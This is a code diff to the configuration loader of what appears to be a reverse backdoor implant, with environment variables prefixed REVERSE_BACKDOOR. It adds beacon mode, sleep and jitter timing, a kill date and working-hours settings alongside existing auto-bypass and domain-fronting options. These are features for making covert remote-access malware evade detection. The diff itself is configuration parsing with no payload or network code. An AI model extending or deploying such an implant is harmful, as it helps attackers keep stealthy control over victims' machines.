@@ -40,6 +40,11 @@ def load_config():
     auto_bypass = env.get('REVERSE_BACKDOOR_AUTO_BYPASS', 'true').lower() == 'true'
     http_mode = env.get('REVERSE_BACKDOOR_HTTP', '').lower() == 'true'
     front_host = env.get('REVERSE_BACKDOOR_FRONT_HOST') or None
+    beacon_mode = env.get('REVERSE_BACKDOOR_BEACON', '').lower() == 'true' or defaults.get('beacon', False)
+    beacon_sleep = float(env.get('REVERSE_BACKDOOR_BEACON_SLEEP') or defaults.get('beacon_sleep', 5.0))
+    beacon_jitter = float(env.get('REVERSE_BACKDOOR_BEACON_JITTER') or defaults.get('beacon_jitter', 0.3))
+    kill_date = env.get('REVERSE_BACKDOOR_KILL_DATE') or defaults.get('kill_date')
+    working_hours = defaults.get('working_hours')
 
     return {
         'server_host': server_host,
@@ -50,4 +55,9 @@ def load_config():
         'auto_bypass': auto_bypass,
         'http_mode': http_mode,
         'front_host': front_host,
+        'beacon': beacon_mode,
+        'beacon_sleep': beacon_sleep,
+        'beacon_jitter': beacon_jitter,
+        'kill_date': kill_date,
+        'working_hours': working_hours,
     }
